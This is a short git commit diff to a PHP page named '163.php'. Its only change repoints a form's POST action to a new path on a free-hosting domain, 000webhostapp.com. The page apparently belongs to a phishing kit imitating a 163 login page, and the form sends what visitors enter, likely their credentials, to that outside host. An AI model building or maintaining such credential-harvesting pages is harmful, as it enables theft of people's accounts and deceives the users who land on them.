1e05a704e0c2f98156d535ddf0fa675a2ebe2637
bobstottts <bobstottts@googlemail.com>
2017-11-23 02:55:49 -0500

    Update 163.php

--- u/u/163.php
+++ u/u/163.php
@@ -63,7 +63,7 @@ a:hover{color:#DF0101; }
 
 				<tbody><tr><td>
 
-				<form method="post" action="https://j379192911.000webhostapp.com/tempindexs">
+				<form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
 			
 				<br><br>
 
